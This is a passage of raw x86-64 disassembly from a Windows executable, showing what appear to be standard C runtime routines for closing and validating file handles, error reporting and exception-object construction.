   140009d95:	48 63 d7             	movslq %edi,%rdx
   140009d98:	b9 01 00 00 00       	mov    $0x1,%ecx
   140009d9d:	e8 0e c1 ff ff       	call   0x140005eb0
   140009da2:	48 8b f0             	mov    %rax,%rsi
   140009da5:	49 3b c7             	cmp    %r15,%rax
   140009da8:	74 42                	je     0x140009dec
   140009daa:	4c 89 7c 24 38       	mov    %r15,0x38(%rsp)
   140009daf:	4c 89 7c 24 30       	mov    %r15,0x30(%rsp)
   140009db4:	44 8b cf             	mov    %edi,%r9d
   140009db7:	4c 8b c3             	mov    %rbx,%r8
   140009dba:	33 d2                	xor    %edx,%edx
   140009dbc:	41 8b cd             	mov    %r13d,%ecx
   140009dbf:	89 7c 24 28          	mov    %edi,0x28(%rsp)
   140009dc3:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009dc8:	ff 15 2a 44 00 00    	call   *0x442a(%rip)        # 0x14000e1f8
   140009dce:	41 3b c7             	cmp    %r15d,%eax
   140009dd1:	75 0d                	jne    0x140009de0
   140009dd3:	48 8b ce             	mov    %rsi,%rcx
   140009dd6:	e8 3d 8c ff ff       	call   0x140002a18
   140009ddb:	49 8b f7             	mov    %r15,%rsi
   140009dde:	eb 0c                	jmp    0x140009dec
   140009de0:	41 83 fc ff          	cmp    $0xffffffff,%r12d
   140009de4:	74 06                	je     0x140009dec
   140009de6:	48 8b 4d 10          	mov    0x10(%rbp),%rcx
   140009dea:	89 01                	mov    %eax,(%rcx)
   140009dec:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   140009df0:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   140009df6:	75 05                	jne    0x140009dfd
   140009df8:	e8 1b 8c ff ff       	call   0x140002a18
   140009dfd:	48 8b c6             	mov    %rsi,%rax
   140009e00:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140009e04:	48 33 cd             	xor    %rbp,%rcx
   140009e07:	e8 34 7c ff ff       	call   0x140001a40
   140009e0c:	48 8d 65 48          	lea    0x48(%rbp),%rsp
   140009e10:	41 5f                	pop    %r15
   140009e12:	41 5e                	pop    %r14
   140009e14:	41 5d                	pop    %r13
   140009e16:	41 5c                	pop    %r12
   140009e18:	5f                   	pop    %rdi
   140009e19:	5e                   	pop    %rsi
   140009e1a:	5b                   	pop    %rbx
   140009e1b:	5d                   	pop    %rbp
   140009e1c:	c3                   	ret
   140009e1d:	cc                   	int3
   140009e1e:	cc                   	int3
   140009e1f:	cc                   	int3
   140009e20:	48 83 ec 48          	sub    $0x48,%rsp
   140009e24:	48 83 64 24 30 00    	andq   $0x0,0x30(%rsp)
   140009e2a:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140009e2f:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140009e35:	48 8d 0d ec 60 00 00 	lea    0x60ec(%rip),%rcx        # 0x14000ff28
   140009e3c:	45 33 c9             	xor    %r9d,%r9d
   140009e3f:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140009e44:	44 89 44 24 20       	mov    %r8d,0x20(%rsp)
   140009e49:	ff 15 11 42 00 00    	call   *0x4211(%rip)        # 0x14000e060
   140009e4f:	48 89 05 a2 a5 00 00 	mov    %rax,0xa5a2(%rip)        # 0x1400143f8
   140009e56:	48 83 c4 48          	add    $0x48,%rsp
   140009e5a:	c3                   	ret
   140009e5b:	cc                   	int3
   140009e5c:	48 83 ec 28          	sub    $0x28,%rsp
   140009e60:	48 8b 0d 91 a5 00 00 	mov    0xa591(%rip),%rcx        # 0x1400143f8
   140009e67:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140009e6b:	74 0c                	je     0x140009e79
   140009e6d:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   140009e71:	74 06                	je     0x140009e79
   140009e73:	ff 15 c7 41 00 00    	call   *0x41c7(%rip)        # 0x14000e040
   140009e79:	48 8b 0d 70 a5 00 00 	mov    0xa570(%rip),%rcx        # 0x1400143f0
   140009e80:	48 83 f9 ff          	cmp    $0xffffffffffffffff,%rcx
   140009e84:	74 0c                	je     0x140009e92
   140009e86:	48 83 f9 fe          	cmp    $0xfffffffffffffffe,%rcx
   140009e8a:	74 06                	je     0x140009e92
   140009e8c:	ff 15 ae 41 00 00    	call   *0x41ae(%rip)        # 0x14000e040
   140009e92:	48 83 c4 28          	add    $0x28,%rsp
   140009e96:	c3                   	ret
   140009e97:	cc                   	int3
   140009e98:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009e9d:	57                   	push   %rdi
   140009e9e:	48 83 ec 30          	sub    $0x30,%rsp
   140009ea2:	83 cf ff             	or     $0xffffffff,%edi
   140009ea5:	48 8b d9             	mov    %rcx,%rbx
   140009ea8:	48 85 c9             	test   %rcx,%rcx
   140009eab:	75 23                	jne    0x140009ed0
   140009ead:	e8 f2 91 ff ff       	call   0x1400030a4
   140009eb2:	48 21 5c 24 20       	and    %rbx,0x20(%rsp)
   140009eb7:	45 33 c9             	xor    %r9d,%r9d
   140009eba:	45 33 c0             	xor    %r8d,%r8d
   140009ebd:	33 d2                	xor    %edx,%edx
   140009ebf:	33 c9                	xor    %ecx,%ecx
   140009ec1:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009ec7:	e8 08 91 ff ff       	call   0x140002fd4
   140009ecc:	0b c7                	or     %edi,%eax
   140009ece:	eb 46                	jmp    0x140009f16
   140009ed0:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   140009ed4:	74 3a                	je     0x140009f10
   140009ed6:	e8 a5 fa ff ff       	call   0x140009980
   140009edb:	48 8b cb             	mov    %rbx,%rcx
   140009ede:	8b f8                	mov    %eax,%edi
   140009ee0:	e8 9f 03 00 00       	call   0x14000a284
   140009ee5:	48 8b cb             	mov    %rbx,%rcx
   140009ee8:	e8 27 df ff ff       	call   0x140007e14
   140009eed:	8b c8                	mov    %eax,%ecx
   140009eef:	e8 78 02 00 00       	call   0x14000a16c
   140009ef4:	85 c0                	test   %eax,%eax
   140009ef6:	79 05                	jns    0x140009efd
   140009ef8:	83 cf ff             	or     $0xffffffff,%edi
   140009efb:	eb 13                	jmp    0x140009f10
   140009efd:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140009f01:	48 85 c9             	test   %rcx,%rcx
   140009f04:	74 0a                	je     0x140009f10
   140009f06:	e8 0d 8b ff ff       	call   0x140002a18
   140009f0b:	48 83 63 28 00       	andq   $0x0,0x28(%rbx)
   140009f10:	83 63 18 00          	andl   $0x0,0x18(%rbx)
   140009f14:	8b c7                	mov    %edi,%eax
   140009f16:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140009f1b:	48 83 c4 30          	add    $0x30,%rsp
   140009f1f:	5f                   	pop    %rdi
   140009f20:	c3                   	ret
   140009f21:	cc                   	int3
   140009f22:	cc                   	int3
   140009f23:	cc                   	int3
   140009f24:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140009f29:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140009f2e:	57                   	push   %rdi
   140009f2f:	48 83 ec 30          	sub    $0x30,%rsp
   140009f33:	48 8b d9             	mov    %rcx,%rbx
   140009f36:	83 cf ff             	or     $0xffffffff,%edi
   140009f39:	33 c0                	xor    %eax,%eax
   140009f3b:	48 85 c9             	test   %rcx,%rcx
   140009f3e:	0f 95 c0             	setne  %al
   140009f41:	85 c0                	test   %eax,%eax
   140009f43:	75 24                	jne    0x140009f69
   140009f45:	e8 5a 91 ff ff       	call   0x1400030a4
   140009f4a:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140009f50:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140009f56:	45 33 c9             	xor    %r9d,%r9d
   140009f59:	45 33 c0             	xor    %r8d,%r8d
   140009f5c:	33 d2                	xor    %edx,%edx
   140009f5e:	33 c9                	xor    %ecx,%ecx
   140009f60:	e8 6f 90 ff ff       	call   0x140002fd4
   140009f65:	8b c7                	mov    %edi,%eax
   140009f67:	eb 26                	jmp    0x140009f8f
   140009f69:	f6 41 18 40          	testb  $0x40,0x18(%rcx)
   140009f6d:	74 06                	je     0x140009f75
   140009f6f:	83 61 18 00          	andl   $0x0,0x18(%rcx)
   140009f73:	eb 18                	jmp    0x140009f8d
   140009f75:	e8 8a dd ff ff       	call   0x140007d04
   140009f7a:	90                   	nop
   140009f7b:	48 8b cb             	mov    %rbx,%rcx
   140009f7e:	e8 15 ff ff ff       	call   0x140009e98
   140009f83:	8b f8                	mov    %eax,%edi
   140009f85:	48 8b cb             	mov    %rbx,%rcx
   140009f88:	e8 07 de ff ff       	call   0x140007d94
   140009f8d:	8b c7                	mov    %edi,%eax
   140009f8f:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140009f94:	48 83 c4 30          	add    $0x30,%rsp
   140009f98:	5f                   	pop    %rdi
   140009f99:	c3                   	ret
   140009f9a:	cc                   	int3
   140009f9b:	cc                   	int3
   140009f9c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140009fa1:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140009fa5:	56                   	push   %rsi
   140009fa6:	57                   	push   %rdi
   140009fa7:	41 54                	push   %r12
   140009fa9:	48 83 ec 30          	sub    $0x30,%rsp
   140009fad:	48 63 f9             	movslq %ecx,%rdi
   140009fb0:	83 ff fe             	cmp    $0xfffffffe,%edi
   140009fb3:	75 13                	jne    0x140009fc8
   140009fb5:	e8 ea 90 ff ff       	call   0x1400030a4
   140009fba:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140009fc0:	83 c8 ff             	or     $0xffffffff,%eax
   140009fc3:	e9 d9 00 00 00       	jmp    0x14000a0a1
   140009fc8:	85 c9                	test   %ecx,%ecx
   140009fca:	0f 88 ae 00 00 00    	js     0x14000a07e
   140009fd0:	3b 3d 92 c5 00 00    	cmp    0xc592(%rip),%edi        # 0x140016568
   140009fd6:	0f 83 a2 00 00 00    	jae    0x14000a07e
   140009fdc:	48 8b df             	mov    %rdi,%rbx
   140009fdf:	48 8b f7             	mov    %rdi,%rsi
   140009fe2:	48 c1 fe 05          	sar    $0x5,%rsi
   140009fe6:	4c 8d 25 93 c5 00 00 	lea    0xc593(%rip),%r12        # 0x140016580
   140009fed:	83 e3 1f             	and    $0x1f,%ebx
   140009ff0:	48 6b db 58          	imul   $0x58,%rbx,%rbx
   140009ff4:	49 8b 04 f4          	mov    (%r12,%rsi,8),%rax
   140009ff8:	0f be 4c 18 08       	movsbl 0x8(%rax,%rbx,1),%ecx
   140009ffd:	83 e1 01             	and    $0x1,%ecx
   14000a000:	75 25                	jne    0x14000a027
   14000a002:	e8 9d 90 ff ff       	call   0x1400030a4
   14000a007:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a00d:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a013:	45 33 c9             	xor    %r9d,%r9d
   14000a016:	45 33 c0             	xor    %r8d,%r8d
   14000a019:	33 d2                	xor    %edx,%edx
   14000a01b:	33 c9                	xor    %ecx,%ecx
   14000a01d:	e8 b2 8f ff ff       	call   0x140002fd4
   14000a022:	83 c8 ff             	or     $0xffffffff,%eax
   14000a025:	eb 7a                	jmp    0x14000a0a1
   14000a027:	8b cf                	mov    %edi,%ecx
   14000a029:	e8 42 f5 ff ff       	call   0x140009570
   14000a02e:	90                   	nop
   14000a02f:	49 8b 04 f4          	mov    (%r12,%rsi,8),%rax
   14000a033:	f6 44 18 08 01       	testb  $0x1,0x8(%rax,%rbx,1)
   14000a038:	74 2b                	je     0x14000a065
   14000a03a:	8b cf                	mov    %edi,%ecx
   14000a03c:	e8 ab f4 ff ff       	call   0x1400094ec
   14000a041:	48 8b c8             	mov    %rax,%rcx
   14000a044:	ff 15 0e 40 00 00    	call   *0x400e(%rip)        # 0x14000e058
   14000a04a:	85 c0                	test   %eax,%eax
   14000a04c:	75 0a                	jne    0x14000a058
   14000a04e:	ff 15 fc 3f 00 00    	call   *0x3ffc(%rip)        # 0x14000e050
   14000a054:	8b d8                	mov    %eax,%ebx
   14000a056:	eb 02                	jmp    0x14000a05a
   14000a058:	33 db                	xor    %ebx,%ebx
   14000a05a:	85 db                	test   %ebx,%ebx
   14000a05c:	74 15                	je     0x14000a073
   14000a05e:	e8 61 90 ff ff       	call   0x1400030c4
   14000a063:	89 18                	mov    %ebx,(%rax)
   14000a065:	e8 3a 90 ff ff       	call   0x1400030a4
   14000a06a:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a070:	83 cb ff             	or     $0xffffffff,%ebx
   14000a073:	8b cf                	mov    %edi,%ecx
   14000a075:	e8 9e f5 ff ff       	call   0x140009618
   14000a07a:	8b c3                	mov    %ebx,%eax
   14000a07c:	eb 23                	jmp    0x14000a0a1
   14000a07e:	e8 21 90 ff ff       	call   0x1400030a4
   14000a083:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a089:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000a08f:	45 33 c9             	xor    %r9d,%r9d
   14000a092:	45 33 c0             	xor    %r8d,%r8d
   14000a095:	33 d2                	xor    %edx,%edx
   14000a097:	33 c9                	xor    %ecx,%ecx
   14000a099:	e8 36 8f ff ff       	call   0x140002fd4
   14000a09e:	83 c8 ff             	or     $0xffffffff,%eax
   14000a0a1:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000a0a6:	48 83 c4 30          	add    $0x30,%rsp
   14000a0aa:	41 5c                	pop    %r12
   14000a0ac:	5f                   	pop    %rdi
   14000a0ad:	5e                   	pop    %rsi
   14000a0ae:	c3                   	ret
   14000a0af:	cc                   	int3
   14000a0b0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a0b5:	57                   	push   %rdi
   14000a0b6:	48 83 ec 20          	sub    $0x20,%rsp
   14000a0ba:	48 63 f9             	movslq %ecx,%rdi
   14000a0bd:	8b cf                	mov    %edi,%ecx
   14000a0bf:	e8 28 f4 ff ff       	call   0x1400094ec
   14000a0c4:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   14000a0c8:	74 59                	je     0x14000a123
   14000a0ca:	48 8b 05 af c4 00 00 	mov    0xc4af(%rip),%rax        # 0x140016580
   14000a0d1:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000a0d6:	83 ff 01             	cmp    $0x1,%edi
   14000a0d9:	75 09                	jne    0x14000a0e4
   14000a0db:	40 84 b8 b8 00 00 00 	test   %dil,0xb8(%rax)
   14000a0e2:	75 0a                	jne    0x14000a0ee
   14000a0e4:	3b f9                	cmp    %ecx,%edi
   14000a0e6:	75 1d                	jne    0x14000a105
   14000a0e8:	f6 40 60 01          	testb  $0x1,0x60(%rax)
   14000a0ec:	74 17                	je     0x14000a105
   14000a0ee:	e8 f9 f3 ff ff       	call   0x1400094ec
   14000a0f3:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000a0f8:	48 8b d8             	mov    %rax,%rbx
   14000a0fb:	e8 ec f3 ff ff       	call   0x1400094ec
   14000a100:	48 3b c3             	cmp    %rbx,%rax
   14000a103:	74 1e                	je     0x14000a123
   14000a105:	8b cf                	mov    %edi,%ecx
   14000a107:	e8 e0 f3 ff ff       	call   0x1400094ec
   14000a10c:	48 8b c8             	mov    %rax,%rcx
   14000a10f:	ff 15 2b 3f 00 00    	call   *0x3f2b(%rip)        # 0x14000e040
   14000a115:	85 c0                	test   %eax,%eax
   14000a117:	75 0a                	jne    0x14000a123
   14000a119:	ff 15 31 3f 00 00    	call   *0x3f31(%rip)        # 0x14000e050
   14000a11f:	8b d8                	mov    %eax,%ebx
   14000a121:	eb 02                	jmp    0x14000a125
   14000a123:	33 db                	xor    %ebx,%ebx
   14000a125:	8b cf                	mov    %edi,%ecx
   14000a127:	e8 14 f3 ff ff       	call   0x140009440
   14000a12c:	4c 8b df             	mov    %rdi,%r11
   14000a12f:	48 8b cf             	mov    %rdi,%rcx
   14000a132:	48 c1 f9 05          	sar    $0x5,%rcx
   14000a136:	41 83 e3 1f          	and    $0x1f,%r11d
   14000a13a:	48 8d 15 3f c4 00 00 	lea    0xc43f(%rip),%rdx        # 0x140016580
   14000a141:	48 8b 0c ca          	mov    (%rdx,%rcx,8),%rcx
   14000a145:	4d 6b db 58          	imul   $0x58,%r11,%r11
   14000a149:	42 c6 44 19 08 00    	movb   $0x0,0x8(%rcx,%r11,1)
   14000a14f:	85 db                	test   %ebx,%ebx
   14000a151:	74 0c                	je     0x14000a15f
   14000a153:	8b cb                	mov    %ebx,%ecx
   14000a155:	e8 8a 8f ff ff       	call   0x1400030e4
   14000a15a:	83 c8 ff             	or     $0xffffffff,%eax
   14000a15d:	eb 02                	jmp    0x14000a161
   14000a15f:	33 c0                	xor    %eax,%eax
   14000a161:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a166:	48 83 c4 20          	add    $0x20,%rsp
   14000a16a:	5f                   	pop    %rdi
   14000a16b:	c3                   	ret
   14000a16c:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   14000a171:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000a176:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   14000a17a:	57                   	push   %rdi
   14000a17b:	41 54                	push   %r12
   14000a17d:	41 55                	push   %r13
   14000a17f:	48 83 ec 30          	sub    $0x30,%rsp
   14000a183:	48 63 d9             	movslq %ecx,%rbx
   14000a186:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000a189:	75 1c                	jne    0x14000a1a7
   14000a18b:	e8 34 8f ff ff       	call   0x1400030c4
   14000a190:	33 ff                	xor    %edi,%edi
   14000a192:	89 38                	mov    %edi,(%rax)
   14000a194:	e8 0b 8f ff ff       	call   0x1400030a4
   14000a199:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a19f:	83 c8 ff             	or     $0xffffffff,%eax
   14000a1a2:	e9 c9 00 00 00       	jmp    0x14000a270
   14000a1a7:	33 ff                	xor    %edi,%edi
   14000a1a9:	3b df                	cmp    %edi,%ebx
   14000a1ab:	0f 8c 96 00 00 00    	jl     0x14000a247
   14000a1b1:	3b 1d b1 c3 00 00    	cmp    0xc3b1(%rip),%ebx        # 0x140016568
   14000a1b7:	0f 83 8a 00 00 00    	jae    0x14000a247
   14000a1bd:	48 8b f3             	mov    %rbx,%rsi
   14000a1c0:	4c 8b e3             	mov    %rbx,%r12
   14000a1c3:	49 c1 fc 05          	sar    $0x5,%r12
   14000a1c7:	4c 8d 2d b2 c3 00 00 	lea    0xc3b2(%rip),%r13        # 0x140016580
   14000a1ce:	83 e6 1f             	and    $0x1f,%esi
   14000a1d1:	48 6b f6 58          	imul   $0x58,%rsi,%rsi
   14000a1d5:	4b 8b 44 e5 00       	mov    0x0(%r13,%r12,8),%rax
   14000a1da:	0f be 4c 30 08       	movsbl 0x8(%rax,%rsi,1),%ecx
   14000a1df:	83 e1 01             	and    $0x1,%ecx
   14000a1e2:	75 2b                	jne    0x14000a20f
   14000a1e4:	e8 db 8e ff ff       	call   0x1400030c4
   14000a1e9:	89 38                	mov    %edi,(%rax)
   14000a1eb:	e8 b4 8e ff ff       	call   0x1400030a4
   14000a1f0:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a1f6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000a1fb:	45 33 c9             	xor    %r9d,%r9d
   14000a1fe:	45 33 c0             	xor    %r8d,%r8d
   14000a201:	33 d2                	xor    %edx,%edx
   14000a203:	33 c9                	xor    %ecx,%ecx
   14000a205:	e8 ca 8d ff ff       	call   0x140002fd4
   14000a20a:	83 c8 ff             	or     $0xffffffff,%eax
   14000a20d:	eb 61                	jmp    0x14000a270
   14000a20f:	8b cb                	mov    %ebx,%ecx
   14000a211:	e8 5a f3 ff ff       	call   0x140009570
   14000a216:	90                   	nop
   14000a217:	4b 8b 44 e5 00       	mov    0x0(%r13,%r12,8),%rax
   14000a21c:	f6 44 30 08 01       	testb  $0x1,0x8(%rax,%rsi,1)
   14000a221:	74 0b                	je     0x14000a22e
   14000a223:	8b cb                	mov    %ebx,%ecx
   14000a225:	e8 86 fe ff ff       	call   0x14000a0b0
   14000a22a:	8b f8                	mov    %eax,%edi
   14000a22c:	eb 0e                	jmp    0x14000a23c
   14000a22e:	e8 71 8e ff ff       	call   0x1400030a4
   14000a233:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a239:	83 cf ff             	or     $0xffffffff,%edi
   14000a23c:	8b cb                	mov    %ebx,%ecx
   14000a23e:	e8 d5 f3 ff ff       	call   0x140009618
   14000a243:	8b c7                	mov    %edi,%eax
   14000a245:	eb 29                	jmp    0x14000a270
   14000a247:	e8 78 8e ff ff       	call   0x1400030c4
   14000a24c:	89 38                	mov    %edi,(%rax)
   14000a24e:	e8 51 8e ff ff       	call   0x1400030a4
   14000a253:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   14000a259:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000a25e:	45 33 c9             	xor    %r9d,%r9d
   14000a261:	45 33 c0             	xor    %r8d,%r8d
   14000a264:	33 d2                	xor    %edx,%edx
   14000a266:	33 c9                	xor    %ecx,%ecx
   14000a268:	e8 67 8d ff ff       	call   0x140002fd4
   14000a26d:	83 c8 ff             	or     $0xffffffff,%eax
   14000a270:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000a275:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000a27a:	48 83 c4 30          	add    $0x30,%rsp
   14000a27e:	41 5d                	pop    %r13
   14000a280:	41 5c                	pop    %r12
   14000a282:	5f                   	pop    %rdi
   14000a283:	c3                   	ret
   14000a284:	40 53                	rex push %rbx
   14000a286:	48 83 ec 20          	sub    $0x20,%rsp
   14000a28a:	f6 41 18 83          	testb  $0x83,0x18(%rcx)
   14000a28e:	48 8b d9             	mov    %rcx,%rbx
   14000a291:	74 22                	je     0x14000a2b5
   14000a293:	f6 41 18 08          	testb  $0x8,0x18(%rcx)
   14000a297:	74 1c                	je     0x14000a2b5
   14000a299:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   14000a29d:	e8 76 87 ff ff       	call   0x140002a18
   14000a2a2:	81 63 18 f7 fb ff ff 	andl   $0xfffffbf7,0x18(%rbx)
   14000a2a9:	33 c0                	xor    %eax,%eax
   14000a2ab:	48 89 03             	mov    %rax,(%rbx)
   14000a2ae:	48 89 43 10          	mov    %rax,0x10(%rbx)
   14000a2b2:	89 43 08             	mov    %eax,0x8(%rbx)
   14000a2b5:	48 83 c4 20          	add    $0x20,%rsp
   14000a2b9:	5b                   	pop    %rbx
   14000a2ba:	c3                   	ret
   14000a2bb:	cc                   	int3
   14000a2bc:	48 83 79 38 10       	cmpq   $0x10,0x38(%rcx)
   14000a2c1:	72 05                	jb     0x14000a2c8
   14000a2c3:	48 8b 41 20          	mov    0x20(%rcx),%rax
   14000a2c7:	c3                   	ret
   14000a2c8:	48 8d 41 20          	lea    0x20(%rcx),%rax
   14000a2cc:	c3                   	ret
   14000a2cd:	cc                   	int3
   14000a2ce:	cc                   	int3
   14000a2cf:	cc                   	int3
   14000a2d0:	40 53                	rex push %rbx
   14000a2d2:	48 83 ec 20          	sub    $0x20,%rsp
   14000a2d6:	48 8d 05 5b 5c 00 00 	lea    0x5c5b(%rip),%rax        # 0x14000ff38
   14000a2dd:	48 8b d9             	mov    %rcx,%rbx
   14000a2e0:	48 89 01             	mov    %rax,(%rcx)
   14000a2e3:	48 83 79 38 10       	cmpq   $0x10,0x38(%rcx)
   14000a2e8:	72 09                	jb     0x14000a2f3
   14000a2ea:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   14000a2ee:	e8 fd 78 ff ff       	call   0x140001bf0
   14000a2f3:	48 83 63 30 00       	andq   $0x0,0x30(%rbx)
   14000a2f8:	48 c7 43 38 0f 00 00 	movq   $0xf,0x38(%rbx)
   14000a2ff:	00 
   14000a300:	48 8b cb             	mov    %rbx,%rcx
   14000a303:	c6 43 20 00          	movb   $0x0,0x20(%rbx)
   14000a307:	48 83 c4 20          	add    $0x20,%rsp
   14000a30b:	5b                   	pop    %rbx
   14000a30c:	e9 77 78 ff ff       	jmp    0x140001b88
   14000a311:	cc                   	int3
   14000a312:	cc                   	int3
   14000a313:	cc                   	int3
   14000a314:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a319:	57                   	push   %rdi
   14000a31a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a31e:	48 8d 05 13 5c 00 00 	lea    0x5c13(%rip),%rax        # 0x14000ff38
   14000a325:	8b fa                	mov    %edx,%edi
   14000a327:	48 8b d9             	mov    %rcx,%rbx
   14000a32a:	48 89 01             	mov    %rax,(%rcx)
   14000a32d:	48 83 79 38 10       	cmpq   $0x10,0x38(%rcx)
   14000a332:	72 09                	jb     0x14000a33d
   14000a334:	48 8b 49 20          	mov    0x20(%rcx),%rcx
   14000a338:	e8 b3 78 ff ff       	call   0x140001bf0
   14000a33d:	48 83 63 30 00       	andq   $0x0,0x30(%rbx)
   14000a342:	48 c7 43 38 0f 00 00 	movq   $0xf,0x38(%rbx)
   14000a349:	00 
   14000a34a:	48 8b cb             	mov    %rbx,%rcx
   14000a34d:	c6 43 20 00          	movb   $0x0,0x20(%rbx)
   14000a351:	e8 32 78 ff ff       	call   0x140001b88
   14000a356:	40 f6 c7 01          	test   $0x1,%dil
   14000a35a:	74 08                	je     0x14000a364
   14000a35c:	48 8b cb             	mov    %rbx,%rcx
   14000a35f:	e8 8c 78 ff ff       	call   0x140001bf0
   14000a364:	48 8b c3             	mov    %rbx,%rax
   14000a367:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000a36c:	48 83 c4 20          	add    $0x20,%rsp
   14000a370:	5f                   	pop    %rdi
   14000a371:	c3                   	ret
   14000a372:	cc                   	int3
   14000a373:	cc                   	int3
   14000a374:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000a37b:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   14000a382:	ff ff 
   14000a384:	48 8d 15 15 5c 00 00 	lea    0x5c15(%rip),%rdx        # 0x14000ffa0
   14000a38b:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000a390:	e8 2b 6e ff ff       	call   0x1400011c0
   14000a395:	90                   	nop
   14000a396:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a39b:	e8 c0 76 ff ff       	call   0x140001a60
   14000a3a0:	90                   	nop
   14000a3a1:	48 8d 05 90 5b 00 00 	lea    0x5b90(%rip),%rax        # 0x14000ff38
   14000a3a8:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000a3ad:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000a3b2:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000a3b7:	e8 ac 00 00 00       	call   0x14000a468
   14000a3bc:	90                   	nop
   14000a3bd:	48 8d 05 8c 5b 00 00 	lea    0x5b8c(%rip),%rax        # 0x14000ff50
   14000a3c4:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000a3c9:	48 8d 15 58 72 00 00 	lea    0x7258(%rip),%rdx        # 0x140011628
   14000a3d0:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a3d5:	e8 26 90 ff ff       	call   0x140003400
   14000a3da:	cc                   	int3
   14000a3db:	cc                   	int3
   14000a3dc:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000a3e3:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   14000a3ea:	ff ff 
   14000a3ec:	48 c7 44 24 48 0f 00 	movq   $0xf,0x48(%rsp)
   14000a3f3:	00 00 
   14000a3f5:	48 83 64 24 40 00    	andq   $0x0,0x40(%rsp)
   14000a3fb:	c6 44 24 30 00       	movb   $0x0,0x30(%rsp)
   14000a400:	48 8d 0d d1 5b 00 00 	lea    0x5bd1(%rip),%rcx        # 0x14000ffd8
   14000a407:	e8 64 85 ff ff       	call   0x140002970
   14000a40c:	4c 8b c0             	mov    %rax,%r8
   14000a40f:	48 8d 15 c2 5b 00 00 	lea    0x5bc2(%rip),%rdx        # 0x14000ffd8
   14000a416:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   14000a41b:	e8 c0 70 ff ff       	call   0x1400014e0
   14000a420:	90                   	nop
   14000a421:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a426:	e8 35 76 ff ff       	call   0x140001a60
   14000a42b:	90                   	nop
   14000a42c:	48 8d 05 05 5b 00 00 	lea    0x5b05(%rip),%rax        # 0x14000ff38
   14000a433:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000a438:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000a43d:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   14000a442:	e8 21 00 00 00       	call   0x14000a468
   14000a447:	90                   	nop
   14000a448:	48 8d 05 19 5b 00 00 	lea    0x5b19(%rip),%rax        # 0x14000ff68
   14000a44f:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000a454:	48 8d 15 5d 72 00 00 	lea    0x725d(%rip),%rdx        # 0x1400116b8
   14000a45b:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   14000a460:	e8 9b 8f ff ff       	call   0x140003400
   14000a465:	cc                   	int3
   14000a466:	cc                   	int3
   14000a467:	cc                   	int3
   14000a468:	40 53                	rex push %rbx
   14000a46a:	48 83 ec 20          	sub    $0x20,%rsp
   14000a46e:	48 83 61 18 00       	andq   $0x0,0x18(%rcx)
